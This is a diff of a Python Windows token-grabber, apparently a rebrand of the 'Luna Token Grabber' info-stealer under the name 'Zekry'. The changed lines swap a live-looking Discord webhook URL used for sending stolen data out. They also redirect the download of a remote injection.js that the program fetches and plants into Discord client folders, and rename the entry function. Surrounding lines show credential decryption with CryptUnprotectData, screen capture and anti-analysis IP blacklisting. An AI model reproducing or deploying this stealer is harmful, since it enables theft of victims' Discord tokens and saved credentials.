@@ -14,7 +14,6 @@ from shutil import copy2
 from sys import argv
 from tempfile import gettempdir, mkdtemp
 from zipfile import ZIP_DEFLATED, ZipFile
-
 import psutil
 import requests
 import wmi
@@ -23,7 +22,7 @@ from discord import Embed, File, SyncWebhook
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
-__WEBHOOK__ = "%https://discord.com/api/webhooks/1024435367878869043/fNcTDpK0bt6KliiUV6Pxwx5i7DYiQc2FywoIulhkTDpNJJO2S6hXphvaL5RY9-gvwFew%"
+__WEBHOOK__ = "%webhook_here%"
 __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
 __ERROR__ = "%_error_enabled%"
@@ -64,7 +63,7 @@ def main(webhook: str):
     Discord()
 
 
-def Luna(webhook: str):
+def Zekry(webhook: str):
     Debug()
 
     procs = [main, Injection]
@@ -720,7 +719,7 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/injection.js").text
+        self.code = requests.get("https://raw.githubusercontent.com/pedrorichil/zekry-grabber/refs/heads/main/injection.js").text
 
         for dir in self.discord_dirs:
             if not os.path.exists(dir):
@@ -873,7 +872,7 @@ class Debug:
 
         ip = requests.get('https://api.ipify.org').text
         mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-        github = "https://github.com/Smug246"
+        github = "https://github.com/pedrorichil"
 
         if ip in self.blackListedIPS:
             return True
@@ -900,4 +899,4 @@ class Debug:
 
 
 if __name__ == '__main__' and os.name == "nt":
-    Luna(__WEBHOOK__)
+    Zekry(__WEBHOOK__)
